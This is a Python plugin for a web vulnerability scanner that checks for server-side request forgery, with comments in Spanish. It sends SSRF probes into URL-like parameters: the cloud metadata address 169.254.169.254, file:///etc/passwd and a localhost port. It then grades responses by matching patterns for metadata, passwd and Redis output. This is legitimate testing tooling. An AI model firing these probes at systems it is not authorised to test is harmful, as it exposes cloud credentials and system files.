#!/usr/bin/env python3
"""plugins/ssrf_verify.py - Verificación SSRF controlada (idea GramFuzz #8).

Pipeline: candidate -> can SSRF exist? -> evidence -> verification ->
confidence. No marca "acepta URL => SSRF": exige evidencia.

  CONFIRMED: metadatos cloud internos o /etc/passwd en respuesta.
  LIKELY:    diferencial interno (DNS/conexión/tiempo) ante URL controlada.
  Sin evidencia: sin hallazgo (INCONCLUSIVE interno, solo log).
"""

import re
import time
from typing import Dict, List

from core.context import Context

try:
    from plugins._verify_common import (
        bodies_differ, safe_fetch, set_param, sig_of, trim,
    )
except ImportError:  # pragma: no cover
    from _verify_common import (
        bodies_differ, safe_fetch, set_param, sig_of, trim,
    )

try:
    from core.budgets import get_budget, need
except ImportError:  # pragma: no cover
    get_budget = None
    need = lambda ctx, label, items: list(items or [])

URLISH_RE = re.compile(
    r"(url|uri|link|src|image|img|webhook|callback|import|preview|feed|"
    r"redirect|next|dest|target|file|path|site|domain|host|endpoint)$",
    re.IGNORECASE)

CONFIRMED_SIGNS = [
    (re.compile(r"ami-id|instance-identity|latest/meta-data", re.I), "AWS metadata"),
    (re.compile(r"metadata\.google\.internal|project-id.*zone", re.I | re.S), "GCP metadata"),
    (re.compile(r"root:x:0:0:", re.I), "/etc/passwd"),
    (re.compile(r"redis_version|connected_clients", re.I), "Redis interno"),
]
LIKELY_SIGNS = re.compile(
    r"connection\s+(refused|timed?\s*out|reset)|dns|resolve|unknown\s+host|"
    r"no\s+route|private|internal|169\.254\.|127\.0\.0\.1|localhost|"
    r"metadata|instance", re.I)

PROBES = [
    "http://169.254.169.254/latest/meta-data/",
    "http://127.0.0.1:9/htforge-closed",
    "file:///etc/passwd",
]


def _candidates(ctx) -> List[Dict]:
    cands = []
    for p in (ctx.get("discovered_params", []) or []):
        if isinstance(p, dict) and URLISH_RE.search(str(p.get("param", ""))):
            cands.append({"url": str(p.get("url", ctx.target)),
                          "param": str(p.get("param", "")),
                          "method": str(p.get("method", "GET")).upper()})
    if not cands:
        for name in ("url", "webhook", "callback", "image"):
            cands.append({"url": ctx.target, "param": name, "method": "GET"})
    return cands


def _replay(ctx, budget, info, value):
    if budget is not None and not budget.consume_payload():
        return None
    if info["method"] == "POST":
        return safe_fetch(ctx, budget, "POST", info["url"],
                          data={info["param"]: value})
    return safe_fetch(ctx, budget, "GET",
                      set_param(info["url"], info["param"], value))


def run(ctx: Context) -> Dict:
    """Verificación SSRF con niveles de confianza evidenciados."""
    budget = get_budget(ctx, "ssrf_verify", {"max_requests": 60, "max_seconds": 120.0,
                                             "max_payloads": 24, "max_targets": 8}) \
        if get_budget else None
    findings: List[Dict] = []
    ctx.log("info", "SSRF verify: candidate -> evidence -> confidence")

    for info in need(ctx, "ssrf_verify", _candidates(ctx))[: (budget.max_targets if budget else 8)]:
        if ctx.stopped or (budget and budget.exhausted()):
            break
        if budget and not budget.consume_target():
            break
        base = safe_fetch(ctx, budget, info["method"], info["url"])
        if base is None:
            continue
        base_sig = sig_of(base)
        if base_sig[0] >= 400:
            continue
        for probe in PROBES:
            if ctx.stopped or (budget and budget.exhausted()):
                break
            t0 = time.monotonic()
            resp = _replay(ctx, budget, info, probe)
            dt = time.monotonic() - t0
            if resp is None:
                continue
            sig = sig_of(resp)
            body = getattr(resp, "text", "") or ""
            state, conf, note, sev = None, 0, "", "high"
            for rx, label in CONFIRMED_SIGNS:
                if rx.search(body):
                    state, conf, note, sev = "CONFIRMED", 92, label, "critical"
                    break
            if state is None and bodies_differ(base_sig, sig) \
                    and LIKELY_SIGNS.search(body):
                state, conf = "LIKELY", 72
                note = f"diferencial interno ({dt:.1f}s) ante URL controlada"
            if state:
                # Retest de la sonda (reproducibilidad) + clasificación
                # de matriz SSRF (idea #1) en confirm_policy.
                retest_ok = False
                rr = _replay(ctx, budget, info, probe)
                if rr is not None:
                    rb = getattr(rr, "text", "") or ""
                    retest_ok = any(rx.search(rb) for rx, _ in CONFIRMED_SIGNS) \
                        if state == "CONFIRMED" else bool(LIKELY_SIGNS.search(rb))
                ev = {
                    "url": info["url"], "parameter": info["param"],
                    "method": info["method"],
                    "baseline": {"status": base_sig[0], "bytes": base_sig[1]},
                    "comparison": {"status": sig[0], "bytes": sig[1],
                                   "seconds": round(dt, 2)},
                    "response_pair": True,
                    "retest": retest_ok,
                    "retest_count": 2 if retest_ok else 1,
                    "response_excerpt": trim(body, 800),
                }
                if state == "CONFIRMED":
                    ev["metadata_response"] = True
                    ev["connection_evidence"] = (
                        f"sonda {probe} -> {sig[0]}/{sig[1]} bytes "
                        f"en {dt:.2f}s")
                if dt >= 4.0:
                    ev["timing_differential"] = round(dt, 2)
                finding = {
                    "type": "ssrf_verified",
                    "severity": sev,
                    "confidence": conf,
                    "verification_state": state,
                    "title": f"SSRF {state.lower()}: {note} vía '{info['param']}'",
                    "detail": f"Baseline {base_sig[0]}/{base_sig[1]} bytes -> "
                              f"sonda {sig[0]}/{sig[1]} bytes en {dt:.1f}s. {note}.",
                    "url": info["url"],
                    "parameter": info["param"],
                    "payload": probe,
                    "evidence": ev,
                }
                findings.append(finding)
                ctx.finding(finding)
                ctx.log("ok", f"SSRF {state}: {info['param']} ({note})")
                break
        else:
            ctx.log("info", f"SSRF sin evidencia en '{info['param']}' "
                            "(INCONCLUSIVE, sin hallazgo)")
    ctx.log("info", f"SSRF verify: {len(findings)} hallazgo(s) evidenciado(s)")
    return {"findings": findings, "budget": budget.summary() if budget else {}}


__version__ = "2.1.0"
__author__ = "HT Team"
PHASE = "attack"
REQUIRES = ["discovered_params"]
